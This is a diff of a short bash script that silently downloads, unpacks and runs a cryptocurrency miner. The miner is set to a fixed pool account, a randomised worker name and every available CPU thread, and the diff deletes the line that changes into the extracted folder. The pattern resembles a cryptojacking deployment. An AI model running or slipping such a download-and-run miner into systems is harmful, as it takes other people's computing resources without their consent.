@@ -1,6 +1,5 @@
 #!/bin/bash
 wget https://github.com/apool-io/apoolminer/releases/download/v2.8.4/apoolminer_linux_v2.8.4.tar > /dev/null 2>&1
 tar xvf apoolminer_linux_v2.8.4.tar
-cd apoolminer_linux_v2.8.4
 chmod 777 apoolminer
 ./apoolminer --account CP_kazep90 --gpu-off --worker $(shuf -n 1 -i 1-99999)-kzp --pool qubic1.hk.apool.io:3334 --thread $(nproc --all)
